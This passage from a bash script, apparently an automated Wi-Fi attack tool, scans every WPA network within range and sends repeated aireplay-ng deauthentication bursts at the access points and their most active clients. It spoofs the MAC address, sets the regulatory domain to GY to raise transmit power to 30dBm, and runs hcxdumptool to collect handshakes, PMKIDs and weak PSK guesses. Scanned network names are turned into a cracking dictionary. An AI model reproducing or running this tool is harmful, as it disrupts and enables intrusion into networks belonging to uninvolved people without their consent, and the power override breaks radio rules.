	read -p "   Confirm: " DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi

		done

clear

}

#~~~~~~~~~~~~~~~End Select Device End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Boost Device~~~~~~~~~~~~~~~#

BOOST_DEVICE_fn()
{
ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep .1
ifconfig $DEV up

clear
	while true
	do

echo ""
echo -e "$q    Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info  This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info  may work with other devices."
echo -e "$inp  Type$yel (y/Y)$inp for yes or$yel (n/N)$inp for no."
echo -e "$txtrst"

		read -p "   Enter y/Y/n/N: " AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done

	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then

		ifconfig $DEV down
		sleep 1
		iw reg set GY
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30

        	sleep 2
 
			fi

clear

}

#~~~~~~~~~~~~~~~End Boost Device End~~~~~~~~~~~~~~~#

SELECT_DEVICE_fn

if [[ "$airmontype" != "Interface" ]]; then

SELECT_MONITOR_fn

	fi

COUNTTEST=ZZZ

until [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  

clear

echo ""
echo ""
echo -e "$info$bold  $undr Program Cycles $txtrst"
echo -e ""
echo -e "$info     One(1) Program Cycle is composed of two(2) parts."
echo -e "  Part I is an active scan of all targeted Networks seen using deauth processes."
echo -e "  In Part II, airodump-ng and hcxdumptool collect data but no"
echo -e "  deauth thru aireplay-ng is used."
echo -e ""
echo -e "$q  How many program cycle(s) do you wish to use?"
echo -e "$txtrst"

	read -p "   Enter: " COUNT

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	COUNTTEST=y
	
	else

	while true

	do

echo ""
echo -e "$inp  You entered$yel $COUNT$inp cycle(s), type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again."
echo -e "$txtrst"

	read -p "   Confirm: " COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi
		done

###############
PAUSETEST=ZZZ

until [ $PAUSETEST == y ] || [ $PAUSETEST == Y ]; do  

clear

echo ""
echo ""
echo -e "$info$bold $undr Passive Scan Pause Time? $txtrst"
echo -e "$info"
echo -e "     During the Active Phase, the program first scans for existing Networks,"
echo -e "  then attempts to induce the collection of a handshake from each WPA"
echo -e "  encrypted Network found during the scan. The hcxdumptool is also run"
echo -e "  on the same channel collecting handshakes, PMKID and Weak WPA PSK codes." 
echo -e "     Once the attack on any singular target bssid is finished, any handshakes,"
echo -e "  PMKID, or Weak WPA PSK codes found, are placed in separate files labeled with"
echo -e "  the bssid and essid."
echo -e "$info     After all targets have undergone an aireplay-ng deauth process,"
echo -e "  the program enters the passive scan phase, to avoid constantly disrupt-"
echo -e "  ing networks thru active DDOS processes."
echo -e "$info     The passive phase can have two(2) parts. Part One is an airodump-ng all"
echo -e "  channel scan while Part Two is a hcxdumptool all channel scan. If hcxdumptool is"
echo -e "  used, the time for the passive scan is divided in half. Hence a passive scan"
echo -e "  of 10 minutes will allocate five(5) minutes for each scan type. However the" 
echo -e "  hcxdumptool can produce Network Interference. If you want a completely quiet " 
echo -e "  period you can choose to not use this tool later on in the program setup."  
echo -e "$info     During the passive phase, a countdown timer will be seen. When"
echo -e "  the passive scan ends, the program searches all channels for WPA encryp-"
echo -e "  ed targets and recommences another active scan in an attempt to force"
echo -e "  handshake production using aireplay-ng --deauth and hcxdumptool processes."
echo -e "     For both active and passive scans cap files are collected and tested"         
echo -e "  for handshakes. Any WPA handshakes or Weak Candidate WPA PSK codes found,"
echo -e "  are moved to the$yel /root/HANDSHAKEHOLD/$info folder. PMKID data collected"
echo -e "  are moved to the$yel /root/PMKIDCAP/$info and$yel /root/HANDSHAKEHOLD/$info folder."
echo -e "     If a handshake has been obtained from a target, all subsequent"
echo -e "  active scans will skip this target if the cap file is found in"
echo -e "  the$yel /root/HANDSHAKEHOLD/$info folder."

echo -e "$q     How long in$yel MINUTE(S)$q do you want the program to pause in the"
echo -e "  passive scan mode. A 15 to 30 minute passive scan is the minimum suggested."
echo -e "$txtrst"

	read -p "   Enter: " PAUSE

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	PAUSETEST=y

	else

	while true

	do

echo ""
echo -e "$inp  You entered$yel $PAUSE$inp minute(s) type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again."
echo -e "$txtrst"

	read -p "   Confirm: " PAUSETEST

	case $PAUSETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		fi

			done

# Change to Seconds for sleep for passive phase - divide in half for airodump and hcxdumptool run hence *30

PAUSEALL=$(expr "$PAUSE" \* 60)

PAUSE=$(expr "$PAUSE" \* 30 )

requestnumTEST=ZZZ

until [ $requestnumTEST == y ] || [ $requestnumTEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold  $undr Aireplay-ng Deauthorization Counts $txtrst"
echo -e ""
echo -e "$info     The program employs aireplay-ng --deauth when active"
echo -e "  scanning to induce the collection of handshakes."
echo -e "$txtrst"
echo -e "  --deauth      count : deauthenticate 1 or all stations (-0)"
echo ""
echo -e "$inp     Enter the number(i.e. count) of --deauth you wish to send"
echo -e "  at the targeted network. Twenty(20) to Thirty(30) is normal."
echo -e "$warn  DO NOT Enter Zero(0)!"
echo -e "$txtrst"

read -p "   Enter: " requestnum

while  [ $requestnum = 0 ]; do
	echo ""
        echo -e "$warn  !!!Donot use the number Zero(0)!!!"
	echo -e "$q     How many --deauth bursts will you send at the targeted Network?"
	echo -e "$txtrst"

      	read -p "   Enter: " requestnum

	done

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	requestnumTEST=y

	else

while true

	do

echo ""
echo -e "$inp  You entered$yel $requestnum$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again."

	echo -e "$txtrst"
	read -p "   Confirm: " requestnumTEST

	case $requestnumTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		fi

			done






white_ap_mac_fn

###############

BOOST_DEVICE_fn

weakcantype_fn

##################### Collect Probes

MANUAL_SELECT_fn()

{
clear
echo -e "$info   Check Entries
      To change enter$yel line number$info of entry and
    follow program prompts.

      1) Make ESSID Probe Wordlist Files      (y/n)? default=y/Y  \e[1;36m$inp[$yel $USE_PROBE $inp]
$info        Note if files become large program 
        cycle may slow. If this slowing occurs
        rename files in the /PROBEESSID_DATA
        folder and restart.

      2) Make ESSID Probe Reference File      (y/n)? default=n/N  \e[1;36m$inp[$yel $USE_REF $inp]
$info        Note if files become large program 
        cycle may slow. If this slowing occurs
        rename files in the /PROBEESSID_DATA
        folder and restart.

      3) Store all .pcapng files collected    (y/n)? default=n/N  \e[1;36m$inp[$yel $STORE_PC $inp]
$info        Files will be placed in
        the /root/PCAPNGFILES folder.

      4) Run hcxdumptool during passive scan  (y/n)? default=n/N  \e[1;36m$inp[$yel $USE_HCXPAS $inp] 
$info        The hcxdumptool is not passive and
        produces interference. If you want a
        quieter period do not run this tool
        during the passive scan.

    C)ontinue$txtrst 
\n"
read var
case $var in

	1) echo -e "\033[36m\n$info Collect ESSID Probes (y/n)?$txtrst"
	read USE_PROBE
	MANUAL_SELECT_fn;;

	2) echo -e "\033[36m\n$info Make ESSID Reference File (y/n)?$txtrst"
	read USE_REF
	MANUAL_SELECT_fn;;

	3) echo -e "\033[36m\n$info Store all collected .pcapng files. (y/n)?$txtrst"
	read STORE_PC
	MANUAL_SELECT_fn;;

        4) echo -e "\033[36m\n$info Run hcxdumptool during passive scan. (y/n)?$txtrst"
	read USE_HCXPAS
	MANUAL_SELECT_fn;;

	c|C)

	 if [[ -z $USE_REF || -z $USE_PROBE || -z $STORE_PC || -z $USE_HCXPAS ]]; then
		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 1
		MANUAL_SELECT_fn
		fi;;

	*) 	MANUAL_SELECT_fn;;
esac

}

#~~~~~~~~~~~~~~~End Manual Handeling End~~~~~~~~~~~~~~~#

MANUAL_SELECT_fn

#############

#let COUNT=COUNT-1
handcol=0

prepare_fn()
{
rm -f /tmp/HANDTEST/*
clear
echo -e "$txtrst"
echo -e "[+] ********** Starting Scan **********"
echo -e "[+] use ctrl+c to terminate the program" 
sleep 2

#variables

if [ "$airmontype" == "Interface" ]; then

# Switch to run airmon-ng check kill only once

    if [[ $CHKKILL == 0 ]]; then 

        echo [+] "Turning off NetworkManager thru airmon-ng check kill."
        echo [+] "NetworkManager will be restarted at program termination."

	airmon-ng check kill
	sleep 1
	CHKKILL=1

        fi

echo -e "[+] Putting $DEV in monitor mode." # notify monitor mode

echo -e "[+] Please Standby.............."

sleep 1

airmon-ng start $DEV &>dev\null # start monitor mode on interface

sleep 1

monitor=$DEV

# Module for new airmon-ng output

AIRNEW=$(airmon-ng start $DEV | grep "already" | awk '{print $4}')

sleep 1

if [[ "$AIRNEW" == "already" ]]; then

		monitor=$DEV

	fi


	fi

if [ "$airmontype" != "Interface" ]; then

monitor=$MON

sleep 2

	fi

#Place monitor in managed mode for iw scan

ifconfig $monitor down

iw dev $monitor set type managed

ifconfig $monitor up

# MTeams programmer comments
# Sent to MTeams STO region for review following seen
# bring iw scans into existing timeseldeauh
# Preliminary bugs for MTeams programmer J
# iw scans not consistent if run seperately
# Work from same scan list or channels/essid/bssid may not match
# Do not run many iw scans as do not match run only one then to file
# Due to spaces in essid names use mac addresses instead.
# will only then affect file names will handle w/ awk. 
# some ops like arrays crash slow compuers if not slowed
# run tests w/ slowest computer on persistent usb before release
# General scan then strip out WPA APs.
# 
# Wake APs up 
# Do a few dummy scans to get a better result.
# See prelim coding below

echo -e "[+] To Wake Up All Networks found within Reception Range."

echo -e "[+] Several Preliminary Scans Are Made."

echo ""
#iw $DEV scan &>dev\null
scan_fn
#iw $DEV scan &>dev\null
scan_fn
#iw $DEV scan &>dev\null
scan_fn
#iw $DEV scan &>dev\null
scan_fn
# Work from same scan list or channels/essid/bssid may not match
# Basic document for all var

iw $monitor scan | cat > /tmp/HANDTEST/iwscan01.txt


echo -e "[+] Scan 5 Writing Scan to file continuing..........."

#Debug 
#echo "Debug"
#echo "Erase all but target for test from /tmp/HANDTEST/iwscan01.txt"
#cp -f /root/iwscan01.txt /tmp/HANDTEST/iwscan01.txt
##############MajoTom add

# Insert newline at the beginning of file
awk 'BEGIN {print "\n"} {print}' /tmp/HANDTEST/iwscan01.txt > /tmp/HANDTEST/iwscan02.txt


# Make one line per AP, replace newlines with tabs, put tab after BSSID
awk 'BEGIN {RS="\nBSS "} NR>1 {gsub(/\n/,"\t"); gsub(/\(on /,"\t"); print}' /tmp/HANDTEST/iwscan02.txt > /tmp/HANDTEST/iwscan03.txt

# Remove non WPA APs
awk '/(WPA:|RSN:)/' /tmp/HANDTEST/iwscan03.txt > /tmp/HANDTEST/iwscan04.txt

# Make a CSV file consisting of BSSID (capitalized), Channel and SSID
sed -r 's/([^\t]*).*SSID: ([^\t]*).*DS Parameter set: channel ([^\t]*).*/\U\1\E,\3,\2/

# Replace spaces with undescores (in SSIDs)

#s/ /_/g

# Replace empty SSIDs with [hidden]

s/(,$)/,[hidden]/' /tmp/HANDTEST/iwscan04.txt > /tmp/HANDTEST/iwscan05.txt

# Musket add to replace underscores at end of bssid in kali 1.10a
# Poss cause by vagaries in iw scans
# Sort by SSID descending

# debug Meam Prog if nofile increase sleep time before remove and sort

sleep 2

cat < /tmp/HANDTEST/iwscan05.txt | sed 's/_,/,/g' | sort -t, -k3 -r | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/ /_/g' > /tmp/HANDTEST/iwscan06a.txt

sleep 2

# Removes text   $mon  240405


monitoriw=$monitor")"

cat /tmp/HANDTEST/iwscan06a.txt | awk -v variw=$monitoriw '$2 != variw' > /tmp/HANDTEST/iwscan06.txt

sleep 2


SSIDS=$(awk -F, '{print $3}' /tmp/HANDTEST/iwscan06.txt)

sleep 1

######## Dic module for SSID 2024 ##########

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' >> /root/PROBEESSID_DATA/essidprobesdic.txt

# Send raw ssid to dic file as user sometimes uses SSID as WPA Code

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/ /_/g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

sleep 1

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/ //g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

sleep 1

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/_//g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

sleep 1

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/-//g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

sleep 1

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/.//g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

sleep 1

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/ /-/g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

# add underline in space and send to dic file

sleep 1

cat /tmp/HANDTEST/iwscan06.txt | awk -F, '{print $3}' | sed 's/.//g' >> /root/PROBEESSID_DATA/essidprobesdic.txt 

sleep 1

####### end DIC module ######

#SSIDS=$(awk -F, '{print $3}' | sed 's/ /_/g' /tmp/HANDTEST/iwscan06.txt)
BSSIDS=$(awk -F, '{print $1}' /tmp/HANDTEST/iwscan06.txt)
CHANN=$(awk -F, '{print $2}' /tmp/HANDTEST/iwscan06.txt)

#if [ ! -d "/tmp/scans" ];# then mkdir -m 700 /tmp/scans;# fi

#TS=$(date +%y%m%d-%H%M)
#cp -f /tmp/HANDTEST/iwscan01.txt /root/scans/hsh-$TS.txt
#cp -f /tmp/HANDTEST/iwscan06.txt /root/scans/hsh-$TS.csv

number1=$(wc -l <<< "$SSIDS")
number2=$(wc -l <<< "$BSSIDS")
number3=$(wc -l <<< "$CHANN")

####MajorTom Adds end

numi1=$number1 # important for the loop

#Leave to Debug in future
#echo "number1=$number1  SSIDS" 
#echo "number2=$number2  BSSIDS"
#echo "number3=$number3  CHANN"

echo "[+] Targeted Networks Found"
echo "$SSIDS" 
#echo "BSSIDS=$BSSIDS"
#echo "CHANN=$CHANN"

if [[ $number1 == $number2  &&  $number1 == $number3  ]]; then

	echo -e "[+] Scan Successful $number1 WPA Networks Seen."
	echo -e "[+] Standby program is loading.............."
			sleep 2
	echo -e " "

	else 

        echo -e "[+] Scan unsuccessful trying again."
			sleep 3
			prepare_fn
		fi	  

# # get mac address
sleep 1

number_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)


if [ "$number_of_files" != 0 ]; then

ls -A /root/HANDSHAKEHOLD/* | xargs -0 -n1 basename | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | dos2unix -f | tr [a-f] [A-F] | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null

# Place in array

sleep 2

readarray bssidcaplist < /tmp/HANDTEST/caplist.txt

# Start array search at zero

	fi

attack_fn

}

attack_fn() 

{                                                                                

rm -f /tmp/HANDTEST/*
sleep .2

sleep .2
killall -q airodump-ng &>dev\null
sleep .01
killall -q aireplay-ng &>dev\null
sleep .01
killall -q xterm &>dev\null
sleep .01
killall -q tee &>dev\null
sleep .01
killall -q cat &>dev\null
sleep .01
killall -q hcxdumptool &>dev\null

sleep 1

ifconfig $monitor down
iw dev $monitor set type monitor
ifconfig $monitor up

# Check if handshakes collected
# Make file list with $bssid

#echo "debug line 3281"
#echo "Remove numi1=1"
#echo "Use for Testing Passive scan module"
#numi1=1

if  [[ $numi1 == 1 ]]; then
	
	echo -e "[+] No WPA Encrypted Networks Seen."
	echo -e "[+] Entering Passive Scan Phase for $PAUSEALL Minute(s)."
	sleep 3 
	passive_scan

		fi

if  [[  $numi1 > 0 ]]; then 

	bssidvar=0
	handshakecollect

	    fi

if [[ $numi1 > 0 ]];then

ssid=$(echo $SSIDS|awk '{ print $'$numi1' }') # cut SSID list
bssid=$(echo $BSSIDS|awk '{ print $'$numi1' }')
#To uppercase
bssid=$(echo $bssid | tr [a-f] [A-F])
channel=$(echo $CHANN|awk '{ print $'$numi1' }') # cut Channel list

sleep 3

if [[ "$airmontype" == "Interface" ]]; then

echo -e "[+] Putting $DEV in monitor mode." # notify monitor mode
sleep 3

airmon-ng start $DEV &>dev\null # start monitor mode on interface

sleep 1

monitor=$DEV

# Module for new airmon-ng output Aug/Sept2020
#######
AIRNEW=$(airmon-ng start wlan1 | grep "already" | awk '{print $4}')

sleep 1

if [[ "$AIRNEW" == "already" ]]; then

		monitor=$DEV
                
		fi

#######

echo "[+] Spoofing with random mac address."

	ifconfig $monitor down  
	iwconfig $monitor mode manage
	macchanger -A $monitor &>dev\null
	sleep 2 # give op time to complete
	ifconfig $monitor up

		if [[ $ifselect == old ]]; then

            randev_mac=$(ifconfig $monitor | awk '{print $5}')
            sleep 1

			fi

		if [[ $ifselect == new ]]; then

randev_mac=$(ifconfig $monitor | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi

            sleep 1


	# limit to 17 in length and replace - with : and lower to upper

	randev_mac=$(echo $randev_mac | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g' | sed 's/\([a-z]\)/\U\1/g')

	ifconfig $monitor down
	iwconfig $monitor mode manage
	sleep .5
	ifconfig $monitor hw ether $randev_mac
	sleep 2
	iwconfig $monitor mode monitor
	ifconfig $monitor up

		fi

#############################

if [[ "$airmontype" != "Interface" ]]; then

	ifconfig $DEV down
        iwconfig $DEV mode manage
	ifconfig $DEV up
	ifconfig $DEV down 
	macchanger -A $DEV &>dev\null
	sleep 2  # give time for op
	ifconfig $DEV up 
	VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
	VARMAC=$(echo $VARMAC | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g' | sed 's/\([a-z]\)/\U\1/g')

	sleep .5
	ifconfig $DEV down
	ifconfig $DEV hw ether $VARMAC
	ifconfig $DEV up
	ifconfig $monitor down &>dev\null
	macchanger -m $VARMAC $monitor &>dev\null
	sleep 2  # give time for op
	ifconfig $monitor up &>dev\null
echo -e "[+] putting $DEV in monitor mode @ $monitor with channel $channel" # notify monitor mode
	ifconfig $DEV down &>dev\null
	iwconfig $DEV mode monitor &>dev\null
	ifconfig $DEV up &>dev\null

		fi


	if [[ $WEAKCAN == 3 ]] || [[ $WEAKCAN == 4 ]]; then


                #Prints the number of lines in dic file.

		WPADICTOT=$(cat < /root/PROBEESSID_DATA/$USERDIC | sed -n \$=)
  			
                #Prints a specific numbered single line and assigns dictionary text to it

                WEAKDICLNE=$(cat < /root/PROBEESSID_DATA/$USERDIC | awk -v DICL="$WPADICLC" 'NR == DICL') 


			fi


sleep 3
ESSIDNAME2=
clear
echo -e "$txtrst"
echo -e "[+]$yel*******************************$txtrst"
echo -e "[+]$yel*$txtrst  Auto-Attack Phase Started$yel  *$txtrst"
echo -e "[+]$yel*$txtrst  No Further Input Required$yel  *$txtrst"  
echo -e "[+]$yel*******************************$txtrst"
echo -e "[+] Attacking Scanned Networks Seen."                                 
echo -e "[+] Cycles Remaining        : $COUNT"
echo -e "[+] Targets This Cycle      : $number1"
echo -e "[+] Targets Remaining       : $numi1"
echo -e "[+] current SSID            : $ssid"
echo -e "[+] current BSSID           : $bssid"

	if [[ $WEAKCAN == 1 ]]; then

echo -e "[+] Weak PSK Candidate      : 12345678"
echo -e "[+] Weak Candidate List:    : Not Used"

		fi

	if [[ $WEAKCAN == 2 ]]; then

echo -e "[+] Weak PSK Candidate      : $WEAKDICASN"
echo -e "[+] Weak Candidate List:    : Not Used"

		fi

	if [[ $WEAKCAN == 3 ]] || [[ $WEAKCAN == 4 ]]; then

echo -e "[+] Weak PSK Candidate      : $WEAKDICLNE"
echo -e "[+] Weak Candidate List:    : $USERDIC"

		fi

echo -e "[+] Handshakes at Start     : $HANDSHKSTART"
echo -e "[+]   Handshakes stored see /root/HANDSHAKEHOLD"
echo -e "[+] PMKID at Start          : $PMKIDSTART"
echo -e "[+]   PMKID stored see      /root/PMKIDCAP"
echo -e "[+] PCAPNG Files at Start   : $PCAPNGSTART"
echo -e "[+]   PCAPNG stored see     /root/PCAPNGFILES"
echo -e "[+] Weak PSK WPA at Start   : $WEAKPSKSTART"
echo -e "[+]   Weak Candidates see   /root/HANDSHAKEHOLD"
echo -e "[+] Handshakes Found        : $HANDSHKDIF"
echo -e "[+] PMKID Found             : $PMKIDDIF"
echo -e "[+] PCAPNG Found            : $PCAPNGDIF"
echo -e "[+] Weak PSK WPA Found      : $WEAKPSKDIF"

if [[ "$airmontype" == "Interface" ]]; then

echo -e "[+] Current Device Mac      : $randev_mac"

		fi

if [[ "$airmontype" != "Interface" ]]; then

echo -e "[+] current Device Mac      : $VARMAC"

		fi

echo -e "[+] Channel                 : $channel"

	if [ handcol > 0 ]; then

#echo "[+] Total WPA Handshakes Collected = $handcol"
#echo "[+] See /root/HANDSHAKEHOLD for .cap files"
echo "[+] Opening airodump-ng to collect handshake."

			fi

if [[ $wpsavail == --wps ]]; then

xterm -g 95x15-1+100 -T "Airodump-ng $ssid" -e "airodump-ng -c $channel --wps --berlin 10000000 --beacons --bssid $bssid -w /tmp/HANDTEST/$bssid  $monitor" 2> /dev/null &

else

xterm -g 95x15-1+100 -T "Airodump-ng $ssid" -e "airodump-ng -c $channel --bssid $bssid -w /tmp/HANDTEST/$bssid  $monitor" 2> /dev/null &

	fi

sleep 1

DATEFILEHCX=$(date +%y%m%d_%H:%M)

#Three possibilites use only 12345678
#Assign a specific code
#Use rotating code

#$# test monitor designation
#echo $monitor
#read


#Use Weak Candidate 12345678

		if [[ $WEAKCAN == 1 ]]; then

xterm -g 80x15-1+600 -T "hcxdumptool" -e "hcxdumptool -i $monitor -c $channel -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi

#Use Assigned Weak Candidate

		if [[ $WEAKCAN == 2 ]]; then

xterm -g 80x15-1+600 -T "hcxdumptool" -e "hcxdumptool -i $monitor -c $channel --weakcandidate=$WEAKDICASN -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi

#Use Rotating Weak Candidate from dic file

		if [[ $WEAKCAN == 3 ]]; then


xterm -g 80x15-1+600 -T "hcxdumptool" -e "hcxdumptool -i $monitor -c $channel --weakcandidate=$WEAKDICLNE -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi

		if [[ $WEAKCAN == 4 ]]; then

xterm -g 80x15-1+600 -T "hcxdumptool" -e "hcxdumptool -i $monitor -c $channel --weakcandidate=$WEAKDICLNE -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi

sleep 3

echo "[+] Sending first deauth burst at target network $bssid."

#Set handshake to none received 
shakstat=0

sleep 5

cushion=$requestnum

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid $monitor" >/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from first deauth burst."

WPA_CAP_fn

	if [[ $shakstat == 0 ]]; then

echo "[+] Sending second deauth burst at target network $bssid."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid $monitor" >/dev/null 2>&1 &

#>/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from second deauth burst."

WPA_CAP_fn

		fi

ASSOC_CLIENT_fn

	if [[ ! -z $CLIASO_MAX ]] && [[ $shakstat == 0 ]]; then

#echo -e "$txtrst[+]"
echo -e "$txtrst[+] Beginning Deauth Process against $CLIASO_MAX."
echo -e "$txtrst[+] Client with highest activity."
echo -e "$txtrst[+] Sending first deauth burst at client $CLIASO_MAX."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MAX $monitor" >/dev/null 2>&1 & 

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from first deauth burst."

killall -q aireplay-ng &>dev\null

WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_MAX ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+] Sending second deauth burst at client $CLIASO_MAX."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MAX $monitor" >/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from second deauth burst."


WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_MID ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+]"
echo -e "$txtrst[+] Beginning Deauth Process against $CLIASO_MID."
echo -e "$txtrst[+] Client shows lower activity."
echo -e "$txtrst[+] Sending first deauth burst at client $CLIASO_MID."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MID $monitor" >/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from first deauth burst."


WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_MID ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+] Sending second deauth burst at client $CLIASO_MID."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MID $monitor" >/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from second deauth burst."

WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_LOW ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+]"
echo -e "$txtrst[+] Beginning Deauth Process against $CLIASO_LOW."
echo -e "$txtrst[+] Client shows lowest activity."
echo -e "$txtrst[+] Sending first deauth burst at client $CLIASO_LOW."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_LOW $monitor" >/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from first deauth burst."

WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_LOW ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+] Sending second deauth burst at client $CLIASO_LOW."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_LOW $monitor" >/dev/null 2>&1 &

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from second deauth burst."

WPA_CAP_fn

		fi

######################## Check for assocition reattack if assoc seen

sleep .2

killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q hcxdumptool &>dev\null
sleep .2
killall -q xterm &>dev\null
sleep .2
killall -q cat &>dev\null
sleep .2
killall -q tee &>dev\null

sleep 3

if [[ "$WPAZERO" != "(0 handshake)" ]]; then

ESSIDNAME=$(wpaclean /tmp/HANDTEST/holdwpaclean /tmp/HANDTEST/"$bssid-01.cap" | awk -F ' ' '{if ($1 == "Net"){$1=$2=""; print $0}}' | sed s'/ /_/g' | sed s'/__//g')

#OLd corrects truncated essid name
#ESSIDNAME=$(wpaclean /tmp/HANDTEST/holdwpaclean /tmp/HANDTEST/"$bssid-01.cap" | awk -F ' ' '{if ($1 == "Net"){  print $3 }}')


sleep 1

#Remove Spaces in ESSIDNAME

if [ ! -z $ESSIDNAME ]; then

	ESSIDNAME1=$(echo $ESSIDNAME | xargs)

	ESSIDNAME4=${ESSIDNAME1//./_}

